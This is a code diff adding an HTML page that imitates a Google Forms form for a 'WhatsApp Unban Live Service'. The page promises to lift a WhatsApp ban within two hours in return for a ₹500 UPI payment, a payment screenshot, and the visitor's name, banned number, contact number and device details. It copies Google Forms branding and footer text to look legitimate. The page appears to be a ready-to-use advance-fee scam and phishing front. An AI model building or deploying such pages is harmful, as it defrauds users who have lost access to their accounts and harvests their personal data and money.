@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>WhatsApp Unban Live Service</title>
+
+  <!-- Google font (optional) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+  <main class="page">
+    <div class="container">
+
+      <!-- Header (like Google Forms header) -->
+      <header class="hdr">
+        <div class="hdr-border"></div>
+        <div class="hdr-top">
+          <h1>WhatsApp Unban Live Service ✔</h1>
+          <div class="p-container">
+            <p class="hdr-p">
+              You just need to fill out this form ✔,<br />
+              Your number will be permanently unbanned within 2 hours.<br />
+              Note: Please provide only your real information ✔.
+            </p>
+          </div>
+        </div>
+
+        <hr />
+
+        <div class="hdr-middle">
+          <p class="hdr-p">
+            The name, email, and photo associated with your Google account will be recorded when you upload files and submit this form.
+          </p>
+        </div>
+
+        <hr />
+
+        <div class="hdr-bottom">
+          <p class="hdr-p">* Indicates required question</p>
+        </div>
+      </header>
+
+      <!-- Form Start -->
+      <form id="unbanForm" class="form" novalidate>
+
+        <!-- Name -->
+        <section class="card error-card">
+          <label class="label">Name <span class="req">*</span></label>
+          <input type="text" id="name" name="name" placeholder="Your answer" />
+          <div class="field-error" id="err-name"></div>
+        </section>
+
+        <!-- WhatsApp Ban Number -->
+        <section class="card error-card">
+          <label class="label">WhatsApp Ban Number <span class="req">*</span></label>
+          <input type="text" id="banNumber" name="banNumber" placeholder="Your answer" />
+          <div class="field-error" id="err-banNumber"></div>
+        </section>
+
+        <!-- Country -->
+        <section class="card error-card">
+          <label class="label">Country <span class="req">*</span></label>
+          <select id="country" name="country">
+            <option value="">Choose</option>
+            <option value="India">India</option>
+            <option value="Pakistan">Pakistan</option>
+            <option value="Others">Others</option>
+          </select>
+          <div class="field-error" id="err-country"></div>
+        </section>
+
+        <!-- Device Type -->
+        <section class="card error-card">
+          <label class="label">
+            Device Type (The mobile phone in which your number is registered 📱) <span class="req">*</span>
+          </label>
+          <input type="text" id="deviceType" name="deviceType" placeholder="Your answer" />
+          <div class="field-error" id="err-deviceType"></div>
+        </section>
+
+        <!-- Your Contact Number -->
+        <section class="card error-card">
+          <label class="label">Your Contact Number <span class="req">*</span></label>
+          <input type="text" id="contactNumber" name="contactNumber" placeholder="Your answer" />
+          <div class="field-error" id="err-contactNumber"></div>
+        </section>
+
+        <!-- Payment Instructions -->
+        <section class="card">
+          <label class="label">
+            Choose 1 Method To Send Payment (₹500 Charge) <span style="font-size: 1.5em;">&downarrow;</span>
+          </label>
+
+          <div class="qr-grid" aria-hidden="true">
+            <div class="qr-card">
+              <img src="fam-scan.jpg" alt="FamApp Scanner" />
+            </div>
+          </div>
+
+          <p class="hint">Scan with your UPI app and pay ₹500. Then upload the screenshot below.</p>
+        </section>
+
+        <!-- Select Payment Method -->
+        <section class="card error-card">
+          <label class="label">Select your Payment Method? <span class="req">*</span></label>
+          <select id="paymentMethod" name="paymentMethod">
+            <option value="">Choose</option>
+            <option value="Google Pay">Google Pay</option>
+            <option value="PhonePe">PhonePe</option>
+            <option value="Paytm">Paytm</option>
+            <option value="Others">Others</option>
+          </select>
+          <div class="field-error" id="err-paymentMethod"></div>
+        </section>
+
+        <!-- Upload Payment Screenshot -->
+        <section class="card error-card">
+          <label class="label">Upload Payment Screenshot <span class="req">*</span></label>
+          <p class="hint">Upload 1 supported file. Max 10 MB.</p>
+
+          <div class="upload-area" id="uploadArea">
+            <input type="file" id="paymentScreenshot" name="paymentScreenshot" accept="image/*,application/pdf" hidden />
+            <button type="button" id="uploadBtn" class="upload-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
+                <path
+                  d="M.5 9.9a.5.5 0 0 1 .5.5V13a2 2 0 0 0 2 2h10a2 
+                  2 0 0 0 2-2v-2.6a.5.5 0 0 1 1 0V13a3 3 0 0 1-3 
+                  3H3a3 3 0 0 1-3-3v-2.6a.5.5 0 0 1 .5-.5z" />
+                <path
+                  d="M7.646 1.146a.5.5 0 0 1 .708 0l3 
+                  3a.5.5 0 0 1-.708.708L8.5 2.707V10.5a.5.5 0 0 
+                  1-1 0V2.707L5.354 4.854a.5.5 0 1 1-.708-.708l3-3z" />
+              </svg>
+              Add file
+            </button>
+          </div>
+
+          <div id="preview" class="preview"></div>
+          <div id="err-paymentScreenshot" class="field-error"></div>
+        </section>
+
+        <!-- Note about Unban -->
+        <section class="card note pay-req">
+          It is mandatory to send the Payment Screenshot. Your Number will be Unbanned Within
+          <b>2 Hours ⏰</b> after that.
+        </section>
+
+        <!-- Buttons -->
+        <section class="actions">
+          <button type="submit" class="btn primary" id="submitBtn">Submit</button>
+          <button type="button" class="btn ghost" id="clearBtn">Clear form</button>
+        </section>
+
+        <!-- Footer -->
+        <footer class="form-footer">
+          <p class="small">Never submit passwords through Google Forms.</p>
+          <p class="tiny">
+            This content is neither created nor endorsed by Google. –
+            <a href="#">Contact form owner</a> –
+            <a href="#">Terms of Service</a> –
+            <a href="#">Privacy Policy</a>
+            <br />
+            Does this form look suspicious? <a href="#">Report</a>
+          </p>
+          <p class="googleforms"><span class="google">Google</span> Forms</p>
+        </footer>
+      </form>
+      <!-- ✅ Form closes properly here -->
+
+    </div>
+  </main>
+
+  <script src="script.js" defer></script>
+</body>
+
+</html>
